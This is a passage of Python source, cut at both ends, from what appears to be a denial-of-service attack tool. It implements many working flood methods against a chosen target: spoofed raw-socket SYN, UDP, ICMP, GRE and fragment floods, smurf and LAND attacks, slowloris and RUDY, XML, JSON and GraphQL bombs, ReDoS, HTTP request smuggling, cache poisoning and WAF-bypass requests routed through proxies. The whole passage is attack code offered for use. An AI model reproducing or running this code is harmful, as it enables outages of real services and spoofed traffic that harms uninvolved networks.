    def _syn_ack_flood(self): self._flag_flood(0x12, "SYN_ACK_FLOOD")
    def _tcp_options_flood(self): self._flag_flood(0x02, "TCP_OPTIONS_FLOOD")
    def _tcp_mss_flood(self): self._flag_flood(0x02, "TCP_MSS_FLOOD")
    def _tcp_urgent_data(self): self._flag_flood(0x20, "TCP_URGENT_DATA")
    def _tcp_zero_window(self): self._flag_flood(0x00, "TCP_ZERO_WINDOW")
    def _ipspoof_syn(self): self._flag_flood(0x02, "IPSPOOF_SYN")

    def _tcp_sack_abuse(self):
        if not self.raw_tcp:
            self._tcp_flood(); return
        while not self._stop:
            try:
                pkt = tcp_packet(self._rip(), self.target_ip, self._rport(),
                                 self.target_port, _rand().next(), 0, 0x02, sack=True)
                self.raw_tcp.sendto(pkt, (self.target_ip, 0))
                self.stats_lf.add_sent(1, len(pkt))
                with self.method_lock: self.method_stats["TCP_SACK_ABUSE"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _tcp_fastopen_flood(self):
        if not self.raw_tcp:
            self._tcp_flood(); return
        while not self._stop:
            try:
                payload = os.urandom(random.randint(64, 512))
                pkt = tcp_packet(self._rip(), self.target_ip, self._rport(),
                                 self.target_port, _rand().next(), 0, 0x02, payload=payload,
                                 fastopen=True)
                self.raw_tcp.sendto(pkt, (self.target_ip, 0))
                self.stats_lf.add_sent(1, len(pkt))
                with self.method_lock: self.method_stats["TCP_FASTOPEN_FLOOD"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _sctp_init_flood(self):
        if not self.raw_sctp:
            if not self.raw_ip:
                self._udp_flood_v2(); return
        while not self._stop:
            try:
                pkt = sctp_init_packet(self._rip(), self.target_ip, self._rport(), self.target_port)
                sock = self.raw_sctp or self.raw_ip
                sock.sendto(pkt, (self.target_ip, 0))
                self.stats_lf.add_sent(1, len(pkt))
                with self.method_lock: self.method_stats["SCTP_INIT_FLOOD"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _ipv6_raw_flood(self):
        try:
            s = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_HDRINCL, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        except Exception:
            self._udp_flood_v2(); return
        try:
            # minimal IPv6 header (40 bytes) + UDP
            while not self._stop:
                try:
                    plen = random.randint(64, 1400)
                    payload = os.urandom(plen)
                    src = os.urandom(16); dst = os.urandom(16)
                    udp = struct.pack("!HHHH", self._rport(), self.target_port, 8 + plen, 0) + payload
                    ipv6_hdr = struct.pack("!IHBB", 0x60000000, len(udp), 17, 64) + src + dst
                    s.sendto(ipv6_hdr + udp, (self.target_ip, 0))
                    self.stats_lf.add_sent(1, len(ipv6_hdr) + len(udp))
                    with self.method_lock: self.method_stats["IPV6_RAW_FLOOD"] += 1
                except Exception: self.stats_lf.add_failed()
                if not self._rate_allow(): continue
        finally:
            with suppress(Exception): s.close()

    def _tcp_flood(self):
        while not self._stop:
            s = None
            try:
                s = self._proxy_tcp_connect(self.target_ip, self.target_port, 1.0)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                req = (f"GET /?{uuid.uuid4().hex} HTTP/1.1\r\nHost: {self.target_host}\r\n"
                       f"User-Agent: {self._rua()}\r\nAccept: */*\r\n"
                       f"Connection: close\r\n\r\n").encode()
                s.sendall(req); self.stats_lf.add_sent(1, len(req))
                with self.method_lock: self.method_stats["TCP_FLOOD"] += 1
            except Exception: self.stats_lf.add_failed()
            finally:
                if s:
                    with suppress(Exception): s.close()
            if not self._rate_allow(): continue

    def _gre_flood(self):
        if not self.raw_ip: self._udp_flood_v2(); return
        while not self._stop:
            try:
                payload = os.urandom(random.randint(100, 1400))
                pkt = ip_header(self._rip(), self.target_ip, 47, len(payload)) + payload
                self.raw_ip.sendto(pkt, (self.target_ip, 0))
                self.stats_lf.add_sent(1, len(pkt))
                with self.method_lock: self.method_stats["GRE_FLOOD"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _esp_flood(self):
        if not self.raw_ip: self._udp_flood_v2(); return
        while not self._stop:
            try:
                payload = os.urandom(random.randint(100, 1400))
                pkt = ip_header(self._rip(), self.target_ip, 50, len(payload)) + payload
                self.raw_ip.sendto(pkt, (self.target_ip, 0))
                self.stats_lf.add_sent(1, len(pkt))
                with self.method_lock: self.method_stats["ESP_FLOOD"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _ipip_flood(self):
        if not self.raw_ip: self._udp_flood_v2(); return
        while not self._stop:
            try:
                inner = ip_header(self._rip(), "8.8.8.8", socket.IPPROTO_UDP, 64) + \
                        struct.pack('!HHHH', 1234, 53, 72, 0) + os.urandom(64)
                pkt = ip_header(self._rip(), self.target_ip, 4, len(inner)) + inner
                self.raw_ip.sendto(pkt, (self.target_ip, 0))
                self.stats_lf.add_sent(1, len(pkt))
                with self.method_lock: self.method_stats["IPIP_FLOOD"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _frag_flood(self):
        if not self.raw_ip: self._udp_flood_v2(); return
        while not self._stop:
            try:
                payload = os.urandom(random.randint(500, 2000))
                frags = fragmented_ip(self._rip(), self.target_ip, socket.IPPROTO_UDP, payload, 8)
                for f in frags: self.raw_ip.sendto(f, (self.target_ip, 0))
                self.stats_lf.add_sent(len(frags), sum(len(f) for f in frags))
                with self.method_lock: self.method_stats["FRAG_FLOOD"] += len(frags)
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _ip_options_flood(self):
        if not self.raw_ip: self._udp_flood_v2(); return
        while not self._stop:
            try:
                payload = os.urandom(64)
                ipopts = b"\x01\x01\x01\x01" + b"\x07\x07" + os.urandom(7) + b"\x00"
                ip_len = 20 + len(ipopts) + len(payload)
                h = struct.pack('!BBHHHBBH4s4s', 0x40 | (len(ipopts)//4 + 5), 0, ip_len,
                                _rand().next() & 0xffff, 0, 64, socket.IPPROTO_UDP, 0,
                                socket.inet_aton(self._rip()), socket.inet_aton(self.target_ip)) + ipopts
                hdr = h[:20]; ck = _checksum(hdr)
                h = h[:10] + struct.pack("!H", ck) + h[12:]
                self.raw_ip.sendto(h + payload, (self.target_ip, 0))
                self.stats_lf.add_sent(1, len(h) + len(payload))
                with self.method_lock: self.method_stats["IP_OPTIONS_FLOOD"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _land_attack(self):
        if not self.raw_tcp: self._tcp_flood(); return
        while not self._stop:
            try:
                pkt = tcp_packet(self.target_ip, self.target_ip, self.target_port,
                                 self.target_port, _rand().next(), 0, 0x02)
                self.raw_tcp.sendto(pkt, (self.target_ip, 0))
                self.stats_lf.add_sent(1, len(pkt))
                with self.method_lock: self.method_stats["LAND_ATTACK"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _jumbo_frame_flood(self):
        if not self.raw_ip: self._udp_flood_v2(); return
        while not self._stop:
            try:
                payload = os.urandom(random.choice([9000, 10000, 12000, 15000]))
                pkt = ip_header(self._rip(), self.target_ip, socket.IPPROTO_UDP, 8 + len(payload)) + \
                      struct.pack("!HHHH", self._rport(), self.target_port, 8 + len(payload), 0) + payload
                self.raw_ip.sendto(pkt, (self.target_ip, 0))
                self.stats_lf.add_sent(1, len(pkt))
                with self.method_lock: self.method_stats["JUMBO_FRAME_FLOOD"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _smurf_attack(self):
        if not self.raw_icmp:
            self._icmp_flood_v2(); return
        while not self._stop:
            try:
                pkt = icmp_packet(self._rip(), "255.255.255.255", os.urandom(64))
                self.raw_icmp.sendto(pkt, ("255.255.255.255", 0))
                self.stats_lf.add_sent(1, len(pkt))
                with self.method_lock: self.method_stats["SMURF_ATTACK"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _tcp_timestamp_spoof(self):
        if not self.raw_ip: self._tcp_flood(); return
        ts_val = random.randint(0, 2**32 - 1)
        ts_ecr = random.randint(0, 2**32 - 1)
        while not self._stop:
            try:
                ts_val = (ts_val + random.randint(1, 1000)) & 0xFFFFFFFF
                ip_len = 52
                ip_src_a = socket.inet_aton(self._rip())
                ip_dst_a = socket.inet_aton(self.target_ip)
                iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_len, random.randint(0, 65535), 0,
                                  random.randint(64, 128), 6, 0, ip_src_a, ip_dst_a)
                ck = _checksum(iph)
                iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_len, random.randint(0, 65535), 0,
                                  random.randint(64, 128), 6, ck, ip_src_a, ip_dst_a)
                seq = random.randint(0, 2**32 - 1)
                window = random.choice([65535, 64240, 29200])
                options = b"\x02\x04\x05\xb4" + b"\x08\x0a" + struct.pack("!I", ts_val) + \
                          struct.pack("!I", ts_ecr) + b"\x01\x01\x01"
                do = (20 + len(options)) // 4 * 4
                tcph = struct.pack("!HHIIBBHHH", self._rport(), self.target_port, seq, 0,
                                   do, 0x02, window, 0, 0) + options
                pseudo = ip_src_a + ip_dst_a + struct.pack("!BBH", 0, 6, len(tcph))
                tcs = _checksum(pseudo + tcph)
                tcph = struct.pack("!HHIIBBHHH", self._rport(), self.target_port, seq, 0,
                                   do, 0x02, window, tcs, 0) + options
                self.raw_ip.sendto(iph + tcph, (self.target_ip, 0))
                self.stats_lf.add_sent(1, len(iph) + len(tcph))
                with self.method_lock: self.method_stats["TCP_TIMESTAMP_SPOOF"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _mac_spoof(self):
        if not HAS_SCAPY:
            self._tcp_flood(); return
        try:
            from scapy.all import Ether, IP as S_IP, TCP as S_TCP, sendp as scapy_sendp
        except Exception:
            self._tcp_flood(); return
        while not self._stop:
            try:
                mac = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
                scapy_sendp(Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / S_IP(dst=self.target_ip) /
                            S_TCP(dport=self.target_port, flags="S"), verbose=False, inter=0.001)
                self.stats_lf.add_sent(1, 60)
                with self.method_lock: self.method_stats["MAC_SPOOF"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _pqc_quic_initial(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        try:
            while not self._stop:
                try:
                    dcid = os.urandom(8); scid = os.urandom(8)
                    header = b"\xc0\x00\x00\x00\x01" + bytes([len(dcid)]) + dcid + bytes([len(scid)]) + scid
                    pqc = os.urandom(1200)
                    pkt = header + b"\x00" + struct.pack(">H", len(pqc)) + pqc
                    s.sendto(pkt, (self.target_ip, self.target_port or 443))
                    self.stats_lf.add_sent(1, len(pkt))
                    with self.method_lock: self.method_stats["PQC_QUIC_INITIAL"] += 1
                except Exception: self.stats_lf.add_failed()
                if not self._rate_allow(): continue
        finally:
            with suppress(Exception): s.close()

    def _icmp_fragment_flood(self):
        if not self.raw_ip: self._udp_flood_v2(); return
        while not self._stop:
            try:
                frag_size = random.choice([512, 1024, 1400])
                payload = os.urandom(frag_size)
                frags = fragmented_ip(self._rip(), self.target_ip, socket.IPPROTO_ICMP, payload, 8)
                for f in frags: self.raw_ip.sendto(f, (self.target_ip, 0))
                self.stats_lf.add_sent(len(frags), sum(len(f) for f in frags))
                with self.method_lock: self.method_stats["ICMP_FRAGMENT_FLOOD"] += len(frags)
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _udp_flood_v2(self):
        target = (self.target_ip, self.target_port)
        if self.raw_udp and IS_LINUX and HAS_LIBC:
            while not self._stop:
                try:
                    batch = []; total_b = 0
                    for _ in range(128):
                        pkt = udp_packet(self._rip(), self.target_ip, self._rport(),
                                         self.target_port, os.urandom(random.randint(1400, 1470)))
                        batch.append(pkt); total_b += len(pkt)
                    sent = sendmmsg_raw(self.raw_udp.fileno(), batch, target)
                    if sent <= 0:
                        for pkt in batch: self.raw_udp.sendto(pkt, target)
                        self.stats_lf.add_sent(len(batch), total_b)
                    else:
                        self.stats_lf.add_sent(sent, total_b * sent // len(batch))
                    with self.method_lock: self.method_stats["UDP_FLOOD_V2"] += len(batch)
                except Exception: self.stats_lf.add_failed()
                if not self._rate_allow(): continue
        elif self.raw_udp:
            while not self._stop:
                try:
                    pkt = udp_packet(self._rip(), self.target_ip, self._rport(),
                                     self.target_port, os.urandom(random.randint(1400, 65000)))
                    self.raw_udp.sendto(pkt, target)
                    self.stats_lf.add_sent(1, len(pkt))
                    with self.method_lock: self.method_stats["UDP_FLOOD_V2"] += 1
                except Exception: self.stats_lf.add_failed()
                if not self._rate_allow(): continue
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
            try:
                while not self._stop:
                    try:
                        data = os.urandom(random.randint(1400, 65000))
                        s.sendto(data, target)
                        self.stats_lf.add_sent(1, len(data))
                        with self.method_lock: self.method_stats["UDP_FLOOD_V2"] += 1
                    except Exception: self.stats_lf.add_failed()
                    if not self._rate_allow(): continue
            finally:
                with suppress(Exception): s.close()

    def _icmp_flood_v2(self):
        if not self.raw_icmp:
            self._udp_flood_v2(); return
        while not self._stop:
            try:
                pkt = icmp_packet(self._rip(), self.target_ip, os.urandom(random.randint(1024, 1470)))
                self.raw_icmp.sendto(pkt, (self.target_ip, 0))
                self.stats_lf.add_sent(1, len(pkt))
                with self.method_lock: self.method_stats["ICMP_FLOOD_V2"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    # ---- HTTP async flood ----
    async def _http_flood_async(self, sem):
        while not self._stop:
            if resource_gate.is_paused():
                await asyncio.sleep(1.5); continue
            if self.net_health and self.net_health.is_paused():
                await asyncio.sleep(1.0); continue
            async with sem:
                if self.adaptive_limiter:
                    while not self.adaptive_limiter.consume(1):
                        if self._stop: return
                        await asyncio.sleep(0.001)
                connector = None
                try:
                    if self.use_proxy and HAS_AIO_SOCKS:
                        entry = proxy_manager.get(policy=self.proxy_policy)
                        if entry:
                            try: connector = ProxyConnector.from_url(entry.url(), ssl=False)
                            except Exception: connector = None
                    if connector is None:
                        connector = aiohttp.TCPConnector(limit=0, ssl=False, enable_cleanup_closed=True)
                    timeout = aiohttp.ClientTimeout(total=4, connect=2, sock_read=2)
                    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
                        q = urllib.parse.urlencode({f"p{i}": os.urandom(6).hex() for i in range(8)})
                        sep = "&" if "?" in self.target_url else "?"
                        url = self.target_url + sep + q
                        headers = HeaderFactory.build(self.target_host, self.waf_bypass)
                        body = os.urandom(random.randint(64, 1024)) if random.random() > 0.5 else None
                        method = random.choice(["GET", "POST", "HEAD", "PUT", "OPTIONS", "DELETE"])
                        async with sess.request(method, url, headers=headers, data=body) as r:
                            await r.read()
                        self.stats_lf.add_sent(1, len(body or b"") + 300)
                        with self.method_lock: self.method_stats["HTTP_FLOOD"] += 1
                        if self.adaptive_limiter: self.adaptive_limiter.record_success()
                except Exception as e:
                    self.stats_lf.add_failed()
                    if self.adaptive_limiter: self.adaptive_limiter.record_error(type(e).__name__)

    async def _slowloris_async(self, sem):
        while not self._stop:
            async with sem:
                try:
                    reader, writer = await asyncio.open_connection(self.target_ip, self.target_port)
                    headers = HeaderFactory.build(self.target_host, self.waf_bypass)
                    head = f"GET /?{os.urandom(4).hex()} HTTP/1.1\r\n"
                    for k, v in headers.items(): head += f"{k}: {v}\r\n"
                    writer.write(head.encode()); await writer.drain()
                    for _ in range(30):
                        if self._stop: break
                        await asyncio.sleep(random.uniform(3, 7))
                        try:
                            writer.write(b"X-Pad-" + os.urandom(4).hex().encode() + b": " +
                                         b"A" * random.randint(50, 200) + b"\r\n")
                            await writer.drain()
                        except Exception: break
                    try: writer.close()
                    except Exception: pass
                    self.stats_lf.add_sent(1, 300)
                    with self.method_lock: self.method_stats["SLOWLORIS_V2"] += 1
                except Exception: self.stats_lf.add_failed()

    async def _slow_read_async(self, sem):
        while not self._stop:
            async with sem:
                try:
                    reader, writer = await asyncio.open_connection(self.target_ip, self.target_port)
                    headers = HeaderFactory.build(self.target_host, self.waf_bypass)
                    head = f"GET /{os.urandom(8).hex()} HTTP/1.1\r\n"
                    for k, v in headers.items(): head += f"{k}: {v}\r\n"
                    writer.write(head.encode() + b"\r\n"); await writer.drain()
                    for _ in range(30):
                        if self._stop: break
                        try:
                            chunk = await asyncio.wait_for(reader.read(1024), timeout=5)
                            if not chunk: break
                            await asyncio.sleep(random.uniform(3, 6))
                        except Exception: break
                    try: writer.close()
                    except Exception: pass
                    self.stats_lf.add_sent(1, 200)
                    with self.method_lock: self.method_stats["SLOW_READ_V2"] += 1
                except Exception: self.stats_lf.add_failed()

    async def _rudy_async(self, sem):
        while not self._stop:
            async with sem:
                try:
                    reader, writer = await asyncio.open_connection(self.target_ip, self.target_port)
                    headers = HeaderFactory.build(self.target_host, self.waf_bypass)
                    head = "POST / HTTP/1.1\r\n"
                    for k, v in headers.items(): head += f"{k}: {v}\r\n"
                    head += "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 10000000\r\n\r\n"
                    writer.write(head.encode()); await writer.drain()
                    for _ in range(50):
                        if self._stop: break
                        try:
                            writer.write(b"a" * 100); await writer.drain()
                            await asyncio.sleep(random.uniform(3, 7))
                        except Exception: break
                    try: writer.close()
                    except Exception: pass
                    self.stats_lf.add_sent(1, 200)
                    with self.method_lock: self.method_stats["RUDY_V2"] += 1
                except Exception: self.stats_lf.add_failed()

    async def _slow_headers_async(self, sem):
        while not self._stop:
            async with sem:
                try:
                    reader, writer = await asyncio.open_connection(self.target_ip, self.target_port)
                    writer.write(f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n".encode())
                    await writer.drain()
                    for i in range(200):
                        if self._stop: break
                        await asyncio.sleep(random.uniform(1, 3))
                        try:
                            writer.write(f"X-H-{i}: {'A'*50}\r\n".encode()); await writer.drain()
                        except Exception: break
                    try: writer.close()
                    except Exception: pass
                    self.stats_lf.add_sent(1, 100)
                    with self.method_lock: self.method_stats["SLOW_HEADERS"] += 1
                except Exception: self.stats_lf.add_failed()

    async def _slow_body_async(self, sem):
        while not self._stop:
            async with sem:
                try:
                    reader, writer = await asyncio.open_connection(self.target_ip, self.target_port)
                    writer.write(f"POST / HTTP/1.1\r\nHost: {self.target_host}\r\n"
                                 f"Content-Length: 5000000\r\n\r\n".encode())
                    await writer.drain()
                    for _ in range(100):
                        if self._stop: break
                        try:
                            writer.write(b"x" * 10); await writer.drain()
                            await asyncio.sleep(random.uniform(2, 5))
                        except Exception: break
                    try: writer.close()
                    except Exception: pass
                    self.stats_lf.add_sent(1, 200)
                    with self.method_lock: self.method_stats["SLOW_BODY"] += 1
                except Exception: self.stats_lf.add_failed()

    async def _slow_post_async(self, sem): await self._slow_body_async(sem)

    async def _ws_frame_flood_async(self, sem):
        if not HAS_WS: return
        uri = self.target_url.replace("http://", "ws://").replace("https://", "wss://")
        while not self._stop:
            async with sem:
                try:
                    async with websockets.connect(uri, ping_interval=None, open_timeout=3,
                                                   max_size=None) as ws:
                        for _ in range(500):
                            if self._stop: break
                            try:
                                await ws.send(os.urandom(256))
                                self.stats_lf.add_sent(1, 256)
                                with self.method_lock: self.method_stats["WEBSOCKET_FRAME_FLOOD"] += 1
                            except Exception: break
                except Exception: self.stats_lf.add_failed()

    async def _ws_zip_bomb_async(self, sem):
        if not HAS_WS: return
        uri = self.target_url.replace("http://", "ws://").replace("https://", "wss://")
        bomb = b"A" * 512
        if HAS_BROTLI:
            with suppress(Exception): bomb = brotli.compress(b"A" * 16777216, quality=11)
        while not self._stop:
            async with sem:
                try:
                    async with websockets.connect(
                        uri, ping_interval=None, open_timeout=3,
                        compression="deflate", max_size=None) as ws:
                        for _ in range(20):
                            if self._stop: break
                            try:
                                await ws.send(bomb)
                                self.stats_lf.add_sent(1, len(bomb))
                                with self.method_lock: self.method_stats["WEBSOCKET_ZIP_BOMB"] += 1
                            except Exception: break
                except Exception: self.stats_lf.add_failed()

    async def _grpc_web_text_bomb_async(self, sem):
        while not self._stop:
            async with sem:
                try:
                    reader, writer = await asyncio.open_connection(self.target_ip, self.target_port)
                    big = "A" * 8000
                    body = (f"----g\r\nContent-Type: application/grpc-web-text\r\n\r\n{big}\r\n"
                            f"----g--\r\n").encode()
                    req = (f"POST /grpc.Service/Method HTTP/1.1\r\nHost: {self.target_host}\r\n"
                           f"Content-Type: application/grpc-web-text\r\n"
                           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
                    writer.write(req); await writer.drain()
                    with suppress(Exception):
                        await asyncio.wait_for(reader.read(1024), timeout=3)
                    try: writer.close()
                    except Exception: pass
                    self.stats_lf.add_sent(1, len(req))
                    with self.method_lock: self.method_stats["GRPC_WEB_TEXT_BOMB"] += 1
                except Exception: self.stats_lf.add_failed()

    # ---- HTTP raw helpers ----
    def _send_http_raw(self, name, build_fn):
        while not self._stop:
            s = None
            try:
                s = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                req = build_fn()
                s.send(req)
                with suppress(Exception):
                    s.settimeout(1); s.recv(512)
                self.stats_lf.add_sent(1, len(req))
                with self.method_lock: self.method_stats[name] += 1
            except Exception: self.stats_lf.add_failed()
            finally:
                if s:
                    with suppress(Exception): s.close()
            if not self._rate_allow(): continue

    def _http_flood_sync(self, name):
        self._send_http_raw(name, lambda: (
            f"GET /?{os.urandom(8).hex()} HTTP/1.1\r\nHost: {self.target_host}\r\n\r\n").encode())

    def _json_bomb(self):
        body = b'{"a":' * 10000 + b'1' + b'}' * 10000
        def build():
            return (b"POST /api HTTP/1.1\r\nHost: " + self.target_host.encode() +
                    b"\r\nContent-Type: application/json\r\nContent-Length: " +
                    str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
        self._send_http_raw("JSON_BOMB", build)

    def _xml_bomb(self):
        body = (b'<?xml version="1.0"?>\n<!DOCTYPE lolz [\n<!ENTITY lol "lol">\n'
                b'<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n'
                b'<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">\n'
                b'<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n'
                b'<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n'
                b'<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">\n'
                b'<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">\n'
                b'<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">\n]>\n'
                b'<lolz>&lol7;</lolz>')
        def build():
            return (b"POST /api HTTP/1.1\r\nHost: " + self.target_host.encode() +
                    b"\r\nContent-Type: application/xml\r\nContent-Length: " +
                    str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
        self._send_http_raw("XML_BOMB", build)

    def _protobuf_bomb(self):
        body = b"\x08\xff\xff\xff\xff\x0f" * 10000
        def build():
            return (b"POST /api HTTP/1.1\r\nHost: " + self.target_host.encode() +
                    b"\r\nContent-Type: application/x-protobuf\r\nContent-Length: " +
                    str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
        self._send_http_raw("PROTOBUF_BOMB", build)

    def _brotli_bomb(self):
        body = b""
        if HAS_BROTLI:
            with suppress(Exception): body = brotli.compress(os.urandom(1024), quality=11)
        if not body: body = b"\x00" * 65536
        def build():
            return (b"POST /api HTTP/1.1\r\nHost: " + self.target_host.encode() +
                    b"\r\nContent-Encoding: br\r\nContent-Type: application/octet-stream\r\n"
                    b"Content-Length: " + str(len(body)).encode() +
                    b"\r\nConnection: close\r\n\r\n" + body)
        self._send_http_raw("BROTLI_BOMB", build)

    def _redos(self):
        body = ("email=" + "a" * 10000 + "X@test.com").encode()
        def build():
            return (b"POST /register HTTP/1.1\r\nHost: " + self.target_host.encode() +
                    b"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " +
                    str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
        self._send_http_raw("REGEX_DOS_REDOS", build)

    def _apache_killer(self):
        ranges = ",".join([f"{i}-{i+1}" for i in range(2000)])
        def build():
            return (b"GET / HTTP/1.1\r\nHost: " + self.target_host.encode() +
                    b"\r\nRange: bytes=" + ranges.encode() + b"\r\nConnection: close\r\n\r\n")
        self._send_http_raw("APACHE_KILLER_V2", build)

    def _range_bomb(self):
        def build():
            ranges = ",".join([f"{random.randint(0,99999)}-{random.randint(100000,999999)}" for _ in range(1000)])
            return (b"GET / HTTP/1.1\r\nHost: " + self.target_host.encode() +
                    b"\r\nRange: bytes=" + ranges.encode() + b"\r\nConnection: close\r\n\r\n")
        self._send_http_raw("RANGE_HEADER_BOMB", build)

    def _smuggle_clte(self):
        req = (b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() +
               b"\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n"
               b"0\r\n\r\nGET /admin HTTP/1.1\r\nX: X")
        self._send_http_raw("HTTP_SMUGGLING_CLTE", lambda: req)

    def _smuggle_tecl(self):
        req = (b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() +
               b"\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n"
               b"5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n")
        self._send_http_raw("HTTP_SMUGGLING_TECL", lambda: req)

    def _smuggle_te_te(self):
        req = (b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() +
               b"\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n"
               b"0\r\n\r\nGET /admin HTTP/1.1\r\nX: X")
        self._send_http_raw("HTTP_SMUGGLING_TE_TE", lambda: req)

    def _request_smuggling_chunk(self):
        req = (b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() +
               b"\r\nTransfer-Encoding: chunked\r\n\r\n"
               b"ffffffff\r\n" + b"A" * 100 + b"\r\n")
        self._send_http_raw("REQUEST_SMUGGLING_CHUNK", lambda: req)

    def _host_header_injection(self):
        while not self._stop:
            s = None
            try:
                s = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                fake = f"{os.urandom(6).hex()}.evil.com"
                req = (f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n"
                       f"X-Forwarded-Host: {fake}\r\nX-Host: {fake}\r\n"
                       f"X-Forwarded-Server: {fake}\r\n"
                       f"User-Agent: {self._rua()}\r\nConnection: close\r\n\r\n").encode()
                s.send(req)
                with suppress(Exception):
                    s.settimeout(1); s.recv(512)
                self.stats_lf.add_sent(1, len(req))
                with self.method_lock: self.method_stats["HOST_HEADER_INJECTION"] += 1
            except Exception: self.stats_lf.add_failed()
            finally:
                if s:
                    with suppress(Exception): s.close()
            if not self._rate_allow(): continue

    def _cf_bypass(self):
        def build():
            spoof = self._rip()
            headers = HeaderFactory.build(self.target_host, True, spoof)
            head = "GET / HTTP/1.1\r\n"
            for k, v in headers.items(): head += f"{k}: {v}\r\n"
            head += "Connection: close\r\n\r\n"
            return head.encode()
        self._send_http_raw("CF_BYPASS", build)

    def _cache_bypass(self):
        def build():
            headers = HeaderFactory.build(self.target_host, self.waf_bypass)
            head = f"GET /?cb={os.urandom(6).hex()} HTTP/1.1\r\n"
            for k, v in headers.items(): head += f"{k}: {v}\r\n"
            head += "Cache-Control: no-cache\r\nPragma: no-cache\r\nConnection: close\r\n\r\n"
            return head.encode()
        self._send_http_raw("CACHE_BYPASS", build)

    def _cache_poisoning(self):
        headers_list = [("X-Forwarded-Host", "evil.com"),
                        ("X-Original-URL", "/admin"),
                        ("X-Rewrite-URL", "/admin")]
        while not self._stop:
            s = None
            try:
                s = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                hn, hv = random.choice(headers_list)
                req = (f"GET /{os.urandom(4).hex()} HTTP/1.1\r\nHost: {self.target_host}\r\n"
                       f"User-Agent: {self._rua()}\r\n{hn}: {hv}\r\nConnection: close\r\n\r\n").encode()
                s.send(req)
                with suppress(Exception):
                    s.settimeout(1); s.recv(512)
                self.stats_lf.add_sent(1, len(req))
                with self.method_lock: self.method_stats["CACHE_POISONING"] += 1
            except Exception: self.stats_lf.add_failed()
            finally:
                if s:
                    with suppress(Exception): s.close()
            if not self._rate_allow(): continue

    def _graphql_depth_bomb(self):
        depth = 10000
        query = "query { " + "a { " * depth + "__typename" + " } " * depth + " }"
        body = json.dumps({"query": query}).encode()
        def build():
            return (b"POST /graphql HTTP/1.1\r\nHost: " + self.target_host.encode() +
                    b"\r\nContent-Type: application/json\r\nContent-Length: " +
                    str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
        self._send_http_raw("GRAPHQL_DEPTH_BOMB", build)

    def _graphql_alias_bomb(self):
        aliases = " ".join([f"a{i}: __typename" for i in range(20000)])
        body = json.dumps({"query": "query { " + aliases + " }"}).encode()
        def build():
            return (b"POST /graphql HTTP/1.1\r\nHost: " + self.target_host.encode() +
